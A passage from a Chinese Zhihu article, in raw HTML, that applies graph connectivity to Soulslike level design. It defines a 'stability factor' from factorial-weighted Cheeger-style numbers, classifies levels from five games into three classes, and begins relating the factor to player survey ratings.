eeimg=\"1\"></p>\n<p>我们又希望，这个最终的观测量有这样两条性质：归一性、收敛性。</p>\n<p>收敛性表现为，我们不希望随着图结构点的数目的变多(对应游戏实体，就是地图摊大饼式的越做越大)就可以使这个观测量的值无限制变大，否则对部分结构小而精的关卡设计就太不公平了。我们希望随着 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数阶数的增大，该观测量可以迅速收敛到某个稳定值。</p>\n<p>归一性表现为，我们希望最终的这个观测量取值范围在 <img src=\"https://www.zhihu.com/equation?tex=0%5Csim1\" alt=\"0\\sim1\" eeimg=\"1\"> 之间，这样的话可以省去很多麻烦，与其他值做比较也简单很多。</p>\n<p>对于归一性，考虑到图论中的奥里定理(Ore's Law)，对于一个n点的完全图(注：任意两点均相连的图)，它的环数为 <img src=\"https://www.zhihu.com/equation?tex=%5Cdfrac%7B%28n-1%29%21%7D%7B2%7D\" alt=\"\\dfrac{(n-1)!}{2}\" eeimg=\"1\"> 。(For Expert：您知道的，在完全图里，有欧拉环和哈密顿环两种环的取法，这里我们讲的是哈密顿环。)因此，我们认为利用阶乘因子去限制<img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数是合理的——或者换一种说法——泰勒级数。</p>\n<p>因此，我们设计方案就是按照泰勒级数去限制高阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数，得到</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cgamma+%3D+a_0+%28+%5Cfrac%7B1%7D%7B1%21%7D+%5Clambda_1+%2B+%5Cfrac%7B1%7D%7B2%21%7D+%5Clambda_2+%2B+%5Cfrac%7B1%7D%7B3%21%7D+%5Clambda_3+%2B+...%29\" alt=\"\\gamma = a_0 ( \\frac{1}{1!} \\lambda_1 + \\frac{1}{2!} \\lambda_2 + \\frac{1}{3!} \\lambda_3 + ...)\" eeimg=\"1\"></p>\n<p>又因为我们要求归一性，利用简单的分析学知识我们定义观测量 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cgamma+%3D+%5Cdfrac%7B%5Csum%5Climits%5E%7Bm%7D_%7Bi%3D1%7D+%5Cdfrac%7B1%7D%7Bi%21%7D+%5Clambda_i%7D%7B%5Csum%5Climits%5E%7Bm%7D_%7Bi%3D1%7D+%5Cdfrac%7B1%7D%7Bi%21%7D%7D\" alt=\"\\gamma = \\dfrac{\\sum\\limits^{m}_{i=1} \\dfrac{1}{i!} \\lambda_i}{\\sum\\limits^{m}_{i=1} \\dfrac{1}{i!}}\" eeimg=\"1\"></p>\n<p>这就是本文在摘要中提到的观测量——稳定因子</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=m\" alt=\"m\" eeimg=\"1\"> 与 <img src=\"https://www.zhihu.com/equation?tex=%5Clambda_i\" alt=\"\\lambda_i\" eeimg=\"1\"> 同上一节，分别代表图 <img src=\"https://www.zhihu.com/equation?tex=G\" alt=\"G\" eeimg=\"1\"> 的顶数和 <img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"i\" eeimg=\"1\"> 阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数。</p>\n<p>特别的，在点数趋于无穷的情况下(对应于无限图，游戏的话，代表箱庭式关卡的“开放世界”极限），有定义</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cgamma_%7B%5Cinfty%7D+%3D+%5Clim%5Climits_%7Bm+%5Cto+%5Cinfty%7D+%5Cdfrac%7B%5Csum%5Climits%5E%7Bm%7D_%7Bi%3D1%7D+%5Cdfrac%7B1%7D%7Bi%21%7D+%5Clambda_i%7D%7B%5Csum%5Climits%5E%7Bm%7D_%7Bi%3D1%7D+%5Cdfrac%7B1%7D%7Bi%21%7D%7D++%3D+%5Cfrac%7B1%7D%7Be%7D+%5Clim%5Climits_%7Bm+%5Cto+%5Cinfty%7D+%5Csum%5Climits%5E%7Bm%7D_%7Bi%3D1%7D+%5Cdfrac%7B1%7D%7Bi%21%7D+%5Clambda_i\" alt=\"\\gamma_{\\infty} = \\lim\\limits_{m \\to \\infty} \\dfrac{\\sum\\limits^{m}_{i=1} \\dfrac{1}{i!} \\lambda_i}{\\sum\\limits^{m}_{i=1} \\dfrac{1}{i!}}  = \\frac{1}{e} \\lim\\limits_{m \\to \\infty} \\sum\\limits^{m}_{i=1} \\dfrac{1}{i!} \\lambda_i\" eeimg=\"1\"></p>\n<p>正如我们之前对待 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数的简化那样，由于稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 收敛的很快，我们只计算到 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 的三阶微扰，即</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=+%5Cgamma%5E%7B%283%29%7D+%3D+%5Cdfrac%7B%5Csum%5Climits%5E%7B3%7D_%7Bi%3D1%7D+%5Cdfrac%7B1%7D%7Bi%21%7D+%5Clambda_i%7D%7B%5Csum%5Climits%5E%7B3%7D_%7Bi%3D1%7D+%5Cdfrac%7B1%7D%7Bi%21%7D%7D+%3D+%5Cfrac%7B3%7D%7B5%7D+%28+%5Clambda_1+%2B+%5Cfrac%7B1%7D%7B2%7D+%5Clambda_2+%2B+%5Cfrac%7B1%7D%7B6%7D+%5Clambda_3%29+\" alt=\" \\gamma^{(3)} = \\dfrac{\\sum\\limits^{3}_{i=1} \\dfrac{1}{i!} \\lambda_i}{\\sum\\limits^{3}_{i=1} \\dfrac{1}{i!}} = \\frac{3}{5} ( \\lambda_1 + \\frac{1}{2} \\lambda_2 + \\frac{1}{6} \\lambda_3) \" eeimg=\"1\"></p>\n<p>根据我们在上一小节算好的各地图 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数的数据表，可以简单的得到稳定因子三阶微扰 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma%5E%7B%283%29%7D\" alt=\"\\gamma^{(3)}\" eeimg=\"1\"> 的数据表。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-dfb7c4a4d67b7ac157079c2948b554e3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic4.zhimg.com/v2-dfb7c4a4d67b7ac157079c2948b554e3_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-97a3df7b0d62104c0d8b4a07e2269113_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic4.zhimg.com/v2-97a3df7b0d62104c0d8b4a07e2269113_r.jpg\"></figure><p>作为一个演示，我们来算一下五点三环构型的稳定因子三阶微扰 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma%5E%7B%283%29%7D\" alt=\"\\gamma^{(3)}\" eeimg=\"1\"> 的值为多少。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-617e3e38dbf6e2bc3b600f25ed926155_b.jpg\" data-size=\"normal\" data-rawwidth=\"209\" data-rawheight=\"327\" class=\"content_image\" width=\"209\"><figcaption>一个简单的计算稳定因子三阶微扰$\\gamma^{(3)}$的例子</figcaption></figure><p>  很简单的，由我们前文计算出来的三阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Clambda_1+%3D+1+-+%5Cdfrac%7B0%7D%7BC%5E%7B1%7D_%7B5%7D%7D+%3D+1\" alt=\"\\lambda_1 = 1 - \\dfrac{0}{C^{1}_{5}} = 1\" eeimg=\"1\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Clambda_2+%3D+1+-+%5Cdfrac%7B2%7D%7BC%5E%7B2%7D_%7B5%7D%7D+%3D+0.8\" alt=\"\\lambda_2 = 1 - \\dfrac{2}{C^{2}_{5}} = 0.8\" eeimg=\"1\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Clambda_3+%3D+1+-+%5Cdfrac%7B3%7D%7BC%5E%7B3%7D_%7B5%7D%7D+%3D+0.7\" alt=\"\\lambda_3 = 1 - \\dfrac{3}{C^{3}_{5}} = 0.7\" eeimg=\"1\"></p>\n<p>因此有</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cgamma%5E%7B%283%29%7D+%3D+%5Cfrac%7B3%7D%7B5%7D+%28+%5Clambda_1+%2B+%5Cfrac%7B1%7D%7B2%7D+%5Clambda_2+%2B+%5Cfrac%7B1%7D%7B6%7D+%5Clambda_3%29+%3D+%5Cfrac%7B3%7D%7B5%7D+%28+1+%2B+%5Cfrac%7B1%7D%7B2%7D+%5Ctimes+0.8%2B+%5Cfrac%7B1%7D%7B6%7D+%5Ctimes+0.7%29+%3D+0.91+\" alt=\"\\gamma^{(3)} = \\frac{3}{5} ( \\lambda_1 + \\frac{1}{2} \\lambda_2 + \\frac{1}{6} \\lambda_3) = \\frac{3}{5} ( 1 + \\frac{1}{2} \\times 0.8+ \\frac{1}{6} \\times 0.7) = 0.91 \" eeimg=\"1\"></p>\n<p>再来仔细的考察一下，为什么 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 能用于定标关卡逻辑结构设计？稳定因子当中的各项来源于各阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数。前文讲到每阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数代表了图结构在更多被删点情况下的稳定度。但其实还有更深层次的理解。</p>\n<p>我们考虑六个顶组成的连通图结构。当我们只需要1阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数为1时，最简单的6顶环就可以满足条件。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8573424f88e4a0e429150f61cba8462e_b.jpg\" data-size=\"normal\" data-rawwidth=\"519\" data-rawheight=\"335\" class=\"origin_image zh-lightbox-thumb\" width=\"519\" data-original=\"https://pic3.zhimg.com/v2-8573424f88e4a0e429150f61cba8462e_r.jpg\"><figcaption>最简单的连通度为2的六顶环</figcaption></figure><p> 更一般的，对于任意关卡逻辑图，只要保证图结构最外侧的极大环所有顶的度都是2即可，那么就一定有该图的1阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数为1。</p>\n<p>倘若我们不只需要1阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数为1，我们希望2阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数也为1时。即任意删去两个点后，图结构依然是一个连通图。此时情况就开始变得有些复杂了，我们需要向结构中添加“精细”的环结构，如下。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7957b16ff2ff083b25a3bb119de9b257_b.jpg\" data-size=\"normal\" data-rawwidth=\"522\" data-rawheight=\"353\" class=\"origin_image zh-lightbox-thumb\" width=\"522\" data-original=\"https://pic4.zhimg.com/v2-7957b16ff2ff083b25a3bb119de9b257_r.jpg\"><figcaption>一个简单的连通度为3的六顶图结构</figcaption></figure><p>  倘若我们要求3阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数也为1，即，我们需要图结构在被删去任意三个点后，依然可以是个连通图，则需要向结构中添加更加“精细”的环结构，如下。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-42978db73fa8974f431ee27ea851f46e_b.jpg\" data-size=\"normal\" data-rawwidth=\"510\" data-rawheight=\"336\" class=\"origin_image zh-lightbox-thumb\" width=\"510\" data-original=\"https://pic3.zhimg.com/v2-42978db73fa8974f431ee27ea851f46e_r.jpg\"><figcaption>连通度为4的六顶图结构</figcaption></figure><p>  从上述的迭代操作中可以看到，低阶的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数反应了图结构的整体成环性质，但想要更高阶的 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数也高，就需要我们向大的环结构当中添加更多小的环结构。</p>\n<p>从这个角度来讲，我们可以得到这样一种看待稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 的视角：稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 越高，代表着各阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数越大，也就代表关卡逻辑图当中的环，具有更加丰富、更加精细的结构。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>类魂”关卡中的通用结构</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>上一小节我们算好了全部地图的稳定因子三阶微扰 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma%5E%7B%283%29%7D\" alt=\"\\gamma^{(3)}\" eeimg=\"1\"> ，在进行统计分析之前，我们先回过头看一下，类魂游戏关卡的最简逻辑图当中，是否存在一些非常常见的、经典的图结构。</p>\n<p>经过我们的观察发现，有如下四种子图结构最常出现，下面做以展示。</p>\n<p><b>1.正四面体结构</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1452286b0cabf52f20a8d072e8c1fcde_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"537\" data-rawheight=\"451\" class=\"origin_image zh-lightbox-thumb\" width=\"537\" data-original=\"https://pic3.zhimg.com/v2-1452286b0cabf52f20a8d072e8c1fcde_r.jpg\"></figure><p><b>2.正四棱锥结构</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d4f1c80bbd2d4767018525b617718f98_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"540\" data-rawheight=\"527\" class=\"origin_image zh-lightbox-thumb\" width=\"540\" data-original=\"https://pic1.zhimg.com/v2-d4f1c80bbd2d4767018525b617718f98_r.jpg\"></figure><p><b>3.三角星结构</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-34e6eba09e81442ec138d47fc9673cad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"591\" data-rawheight=\"521\" class=\"origin_image zh-lightbox-thumb\" width=\"591\" data-original=\"https://pic2.zhimg.com/v2-34e6eba09e81442ec138d47fc9673cad_r.jpg\"></figure><p><b>4.五点三环结构</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4602f3f77a188f8c1f8441220264fd68_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"486\" data-rawheight=\"500\" class=\"origin_image zh-lightbox-thumb\" width=\"486\" data-original=\"https://pic1.zhimg.com/v2-4602f3f77a188f8c1f8441220264fd68_r.jpg\"></figure><p>为了分析各种构型的优势与劣势，我们不妨列出四种图结构的数据表。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b1d6776391e0d08deecaefbea478c124_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1088\" data-rawheight=\"231\" class=\"origin_image zh-lightbox-thumb\" width=\"1088\" data-original=\"https://pic1.zhimg.com/v2-b1d6776391e0d08deecaefbea478c124_r.jpg\"></figure><p>可以看到，四种子图结构的稳定因子都比较高，在 <img src=\"https://www.zhihu.com/equation?tex=0.91%5Csim1\" alt=\"0.91\\sim1\" eeimg=\"1\"> 之间。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p><b>正四面体结构</b>，稳定因子最高，且是四个点构成的完全图，连通性最好，常用于关卡中的小局域的、高质量的精致探索。</p>\n<p>应用该结构的地图有——魂1:绘画世界、底层、地下墓地、小隆德—飞龙谷一线、公爵书库。魂3:大书库、幽邃教堂、教宗后院。血源：亚楠城、猎人的噩梦、研究大厅、小渔村。仁王：潸然落雪、佐贺山的武士。帕斯卡：圣塔、伊瑟流姆、赐福之地。</p>\n<p><b>正四棱锥结构</b>，稳定因子0.9636为第二高位，环点比高达0.8，常用于构造开放性探索区域，让玩家拥有更大的探索自由度。</p>\n<p>应用该结构的地图有——魂1:绘画世界、乌拉席露、地下墓地、夹缝森林—底层一线、公爵书库。魂3:地下监牢、环印城、绘画世界。血源：亚楠城、旧亚楠、研究大厅。仁王：沉睡的灵石、蠢动的银矿、佐贺山的武士。帕斯卡：伊西索亚。</p>\n<p><b>三角星结构</b>，稳定因子0.94中位，兼顾开放性探索与延展性，极大环边数较多，以及两个度数为4的顶。</p>\n<p>应用该结构的地图有——魂1:绘画世界、乌拉席露、地下墓地、城外不死镇、塞恩古城飞龙桥—病村一线、公爵书库。魂3:不死聚落、熏烟湖、大书库、幽邃教堂、法兰要塞、伊鲁席尔。血源：曼西斯梦魇、未见村、血源全流程、亚楠城、猎人的噩梦、研究大厅、小渔村。仁王：沉睡的灵石、蠢动的银矿、佐贺山的武士。帕斯卡：地下溶洞、海格姆、伊迪斯、圣塔、伊瑟流姆、赐福之地。</p>\n<p><b>五点三环构型</b>，类魂游戏最爱用的结构，能够保稳定因子0.91，延展性极好，极大环边数很多，方便向外延拓地图，有时甚至成为地图桥接的中枢核心。</p>\n<p>举例：有这种子图结构的太多了，基本各个地图都有。举几个特殊例子吧——整个地图化简下来正好就是五点三环构型的:</p>\n<p>北方不死院、妖王庭院、黑森林庭院、治愈教会上层、关原。</p>\n<p>这几张地图的结构直接就是五点三环。也就是说尽管外在的美术素材千差万别，这几张地图内部的逻辑是相一致的——或者，更直白的说，这五张地图是“同构”的。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>关卡普适类</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>在这一小节，我们将要做的，就是兑现在前言里的承诺——纵向的剖开各个游戏，给予各个关卡一个新的分类。</p>\n<p>我们选择的参量就是前文中构建的“稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> ”。</p>\n<p>作为一个尝试，我们不妨拿出前一小节所述的四种最简单的类魂关卡构型作为划线标准。</p>\n<p>我们选择三角星构型和五点三环构型，他们的稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 分别为0.94和0.91，让我们把这两个构型放在全部关卡的长表里，按三阶稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma%5E%7B%283%29%7D\" alt=\"\\gamma^{(3)}\" eeimg=\"1\"> 的值降序排列，得到如下的三段。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6722a8fb1b97e6a365feed2bfbdb3904_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic1.zhimg.com/v2-6722a8fb1b97e6a365feed2bfbdb3904_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f1f3d2d7c4c1bd11833336ab56a3c5cc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic1.zhimg.com/v2-f1f3d2d7c4c1bd11833336ab56a3c5cc_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-218483596ec3fbcaa420dc779e8298dd_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1323\" data-rawheight=\"1871\" class=\"origin_image zh-lightbox-thumb\" width=\"1323\" data-original=\"https://pic2.zhimg.com/v2-218483596ec3fbcaa420dc779e8298dd_r.jpg\"></figure><p>此时，我们可以看到全部关卡被大致相等的划分成了三个“类别”，我们称之为关卡“普适类(Universality Class)”。稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 就是区分关卡处于哪一个普适类的“观测量(Observable)”。一般性的，我们会认为，同一个普适类里面的关卡，会有大致类似的一些性质，与其他普适类的会相区分开。</p>\n<p>对于类魂游戏，在本文的方案下，我们将按照稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值将全部关卡区分为三个普适类——</p>\n<p>高 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类，代表关卡最简逻辑图 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值介于 <img src=\"https://www.zhihu.com/equation?tex=0.94%5Csim1\" alt=\"0.94\\sim1\" eeimg=\"1\"> 之间</p>\n<p>中 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类，代表关卡最简逻辑图 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值介于 <img src=\"https://www.zhihu.com/equation?tex=0.91%5Csim0.94\" alt=\"0.91\\sim0.94\" eeimg=\"1\"> 之间；</p>\n<p>低 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类，代表关卡最简逻辑图 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值介于 <img src=\"https://www.zhihu.com/equation?tex=0%5Csim0.91\" alt=\"0\\sim0.91\" eeimg=\"1\"> 之间；</p>\n<p>我们不妨统计一下，五款类魂游戏，处于各个普适类当中的关卡数目占比为多少？</p>\n<ul><li><i>五款类魂游戏当中，属于各个普适类的关卡数目占各自游戏总关卡数目之比</i></li></ul>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<th></th>\n<th>魂1</th>\n<th>魂3</th>\n<th>仁王</th>\n<th>血源</th>\n<th>帕斯卡</th>\n</tr>\n<tr>\n<td>高\\gamma普适类</td>\n<td>46.15%</td>\n<td>21.43%</td>\n<td>0.00%</td>\n<td>31.25%</td>\n<td>30.00%</td>\n</tr>\n<tr>\n<td>中\\gamma普适类</td>\n<td>38.46%</td>\n<td>57.14%</td>\n<td>18.75%</td>\n<td>43.75%</td>\n<td>30.00%</td>\n</tr>\n<tr>\n<td>低\\gamma普适类</td>\n<td>15.38%</td>\n<td>21.43%</td>\n<td>81.25%</td>\n<td>25.00%</td>\n<td>40.00%</td>\n</tr>\n</tbody></table>\n<p>我们由此可以看出，五个类魂游戏关卡的地图设计存在差异性。</p>\n<p>先来看三个经典FS本家的魂类游戏。</p>\n<p>魂1大部分地图(46.15%)都属于高 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类；</p>\n<p>魂3大部分地图(57.14%)都属于中 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类；</p>\n<p>血源大部分地图(43.75%)都属于中 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适，同时属于高 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类的占比(31.25%)比魂3的21.43%)高一些；</p>\n<p>再来看仁王，仁王1的大部分地图(81.25%)属于低 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类，少量(18.75%)属于中 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类；</p>\n<p>国产游戏帕斯卡的关卡在三个普适类当中，占比非常均匀，考虑到其实际可游玩地图只有十张，几乎就是各占 <img src=\"https://www.zhihu.com/equation?tex=%5Cdfrac%7B1%7D%7B3%7D\" alt=\"\\dfrac{1}{3}\" eeimg=\"1\"> ，特别注意到，帕斯卡契约有三个关卡的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值达到了0.94以上的高 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类——这三张地图分别是圣塔(0.9517)、赐福之地(0.9445)、地下溶洞(0.9418)。</p>\n<p>直到这张表为止，本文的主要论证部分便结束了。我们成功得到了这样一个结论：</p>\n<p><b>在不同的类魂游戏当中，关卡地图设计的逻辑存在本质上的差异。差异程度可以通过关卡的稳定因子</b> <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"><b>值来确定。</b></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>稳定因子的应用</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>玩家满意度与稳定因子</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这一章我们将开始探讨对稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 的实际应用。请读者注意，直到上一章结束，我们的整个论述体系都是非常严格的、客观的。无论一个人他的游戏设计水平、游戏经济水平如何，只要利用图论，按照本文上述的范式来研究，就一定能得出结论——在解析值 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 的划分下，五款游戏的关卡逻辑有着本质上的不同。</p>\n<p>魂1的高 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 关卡会更多一点，魂3的中 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 关卡更多一点，仁王的低 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 关卡更多一点。但是我们截止目前，能得到也仅能得到的结论是，魂1的关卡设计逻辑与仁王“不一样”，我们无法说明，魂1的地图就是比仁王“好”。因为“好”与“坏”这个东西是非常主观的，完全凭借玩家和评价人的喜好。</p>\n<p>我们这一章要做的事情就不会向之前那样完全严格，我们试图去做一点“价值判断”，我们试图找到 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值(这样一个客观的数学量)与玩家对关卡喜好程度(这个是主观感性认知)之间，是否存在一定的相关性。</p>\n<p>直接去找评分网站上面的评分是一个最简单的方法，但是这些评分都有一个问题——太笼统了，我们需要一些更具体的、精确到每个关卡的评分数据。</p>\n<p>作为一种尝试，我们发布了对<a href=\"https://link.zhihu.com/?target=https%3A//www.wjx.cn/vj/to3vwnH.aspx\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">黑魂3</a> 、<a href=\"https://link.zhihu.com/?target=https%3A//www.wjx.cn/vj/Q1EiTL3.aspx\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">黑魂1</a> 、<a href=\"https://link.zhihu.com/?target=https%3A//www.wjx.cn/vj/PcZhI53.aspx\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">血源诅咒</a> 、<a href=\"https://link.zhihu.com/?target=https%3A//www.wjx.cn/vj/wFajFNK.aspx\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">仁王1</a> 、 <a href=\"https://link.zhihu.com/?target=https%3A//www.wjx.cn/vj/r9C2R4u.aspx\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帕斯卡契约</a> 五款游戏当中全部关卡评价的调查问卷。(编者按：事实上，我们也只能通过调查问卷的方式来得到玩家的游戏体验的反馈——尽管这方法非常的不可信。如果要求更进一步的、更有说服力的研究，只能祈祷神经科学的突破了，让我们能直接通过人体的各种体征信号来观测玩家的情绪体验。)</p>\n<p>对于该调查问卷，我们直接列出玩家对关卡的打分，与该关卡的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值的坐标点图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-91a00e58000a8f62a4ba977fdf94d6c1_b.jpg\" data-size=\"normal\" data-rawwidth=\"959\" data-rawheight=\"670\" class=\"origin_image zh-lightbox-thumb\" width=\"959\" data-original=\"https://pic2.zhimg.com/v2-91a00e58000a8f62a4ba977fdf94d6c1_r.jpg\"><figcaption>如图所示，各点给出了各个关卡的玩家评分均值以及误差棒</figcaption></figure><p>一个积极的结果是，可以看出二者确实大体成正相关。不妨拟合之，有</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-20fddab56e53195def873bc236ce67a2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"971\" data-rawheight=\"682\" class=\"origin_image zh-lightbox-thumb\" width=\"971\" 